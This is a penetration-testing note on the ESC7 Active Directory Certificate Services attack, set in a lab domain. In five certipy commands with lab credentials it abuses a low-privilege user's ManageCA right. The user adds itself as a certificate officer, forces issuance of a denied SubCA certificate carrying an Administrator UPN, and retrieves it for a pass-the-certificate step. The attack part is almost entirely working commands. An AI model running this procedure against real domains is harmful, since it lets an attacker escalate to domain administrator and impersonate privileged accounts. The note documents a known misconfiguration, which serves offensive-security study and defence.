---
title: ESC7
tags:
  - esc
  - adcs
---
### ESC7
This misconfiguration does not apply on certificate template but Certificate Authority (CA) configuration and applies when compromised user/group does have `Manage CA` permission on the CA. Hence, this special ACL can be ab(use)d to add another ACL, `Issue and Managed Certificate` to the controlled user/group in order to *issue* an invalid certificate request based on the certificate ID. 

**Requirements**

| Attributes                   | Value | Pre-requisite |
| ---------------------------- | ----- | ------------- |
| ManageCA                     | True  |               |
| Issue and Manage Certificate | True  | ManageCA      |


1. Verify CA configuration with [certipy](https://github.com/ly4k/Certipy). It should identify that the CA configuration is vulnerable to ESC7 attack with `lowpriv` user having `ManageCA` permission on the CA server.

```bash
certipy find -u 'lowpriv@bionic.local' -p 'Password1234' -dc-ip 10.66.66.3 -stdout -text -enabled -vulnerable
```

![[esc7_ca_vuln.png]]

![[esc7_gui_ca_vuln.png]]

2. We can basically configuration the CA! Now lets enable `Issue and Manage Certificates` on the compromised user `lowpriv`. Use [certipy](https://github.com/ly4k/Certipy) ca submodule with `-add-officer` flag as follows:

```bash
certipy ca -u 'lowpriv@bionic.local' -p 'Password1234' -ca bionic-AD-CA -add-officer 'lowpriv' -dc-ip 10.66.66.3 -target-ip 10.66.66.3
```

![Added extra permission for lowpriv user](esc7_add_officer.png)

3. Request **SubCA** certificate. This should throw errors `CERTSRV_E_TEMPLATE_DENIED`, basically saying we don't have permission to request for specified certificate. Please save the private key to be used later on.

```bash
certipy req -u 'lowpriv@bionic.local' -p 'Password1234' -ca bionic-AD-CA -template SubCA -upn 'Administrator@bionic.local' -target 10.66.66.3 -dc-ip 10.66.66.3
```

![[esc7_init_req_failed.png]]

4. Having `Issue and Manage Certificates` permission enabled. Denied template can easily be issued back. Use [certipy](https://github.com/ly4k/Certipy) ca submodule with `-issue-request` flag with request ID.

```bash
certipy ca -u 'lowpriv@bionic.local' -p 'Password1234' -ca bionic-AD-CA -dc-ip 10.66.66.3 -target-ip 10.66.66.3 -issue-request 14
```

![[esc7_issue_certificate.png]]

5. Retrieve back the denied certificate request. Note that this steps will require the previously saved private key `<request-id>.key`.

```bash
certipy req -u 'lowpriv@bionic.local' -p 'Password1234' -ca bionic-AD-CA -target 10.66.66.3 -retrieve 14
```

![[esc7_retrieve_certificate.png]]

6. Proceed with [Pass the Certificate](#pass-the-certificate) attack.
